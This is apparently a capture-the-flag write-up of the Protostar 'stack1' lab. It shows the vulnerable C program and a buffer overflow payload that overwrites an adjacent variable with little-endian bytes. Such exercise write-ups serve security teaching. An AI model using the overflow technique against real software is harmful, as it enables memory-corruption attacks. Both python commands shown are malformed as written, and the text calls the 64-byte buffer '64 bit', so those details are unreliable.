---
author: "faizul"
title: "Protostar Stack-01"
date: 2020-09-30T12:30:06+10:00
description: "Exploit-Exercise Protostar Stack-1"
draft: false
hideToc: false
enableToc: true
enableTocContent: false
image: images/protostar/protostar.jpeg
tags: 
- reverse-engineering
- protostar
- exploit-exercise
- buffer-overflow
categories:
- writeup
- reverse-engineering
- buffer-overflow
series:
- protostar
---

# Stack 1

## About

This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.

This level is at /opt/protostar/bin/stack1

### Hints

- If you are unfamiliar with the hexadecimal being displayed, `man ascii` is your friend.
- Protostar is little endian


## Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

## First run
```bash
user@protostar:/opt/protostar/bin$ ./stack1 a
Try again, you got 0x00000000


user@protostar:/opt/protostar/bin$ ./stack1 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Try again, you got 0x00000061
```

Just like last activity, i use the same payload as the code also hold only 64 bit value of buffer and looks like i almost solve the activity. 

Lets try the python payload.

```bash
user@protostar:~$ python -c "print 'A' * 65 | xargs /opt/protostar/bin/stack1

Try again, you got 0x00000041
```

Dig in the code, we can found that `if(modified == 0x61626364)` then the program will print `you have correctly got the variable to the right value`. 

The value of 0x61626364 is actually hexadecimal value that gave us x64 which is equal to d, x63 to c, x62 to b and x61 to a.

Remember the hints given on the #About section, `Protostar is little endian`. This means the value should be in inverse where `least significant byte in the smallest address`. 

In order to satisfy the value set on code, we have to place the payload like `dcba` or `\x64\x63\x62\x61`.

```bash
user@protostar:~$ python `print("A" * 64 + "\x64\x63\x62\x61")` | xargs /opt/protostar/bin/stack1

you have correctly got the variable to the right value
```

## References

1. [Big-endian vs Little-endian](https://levelup.gitconnected.com/little-endian-vs-big-endian-eb2a2c3a9135)
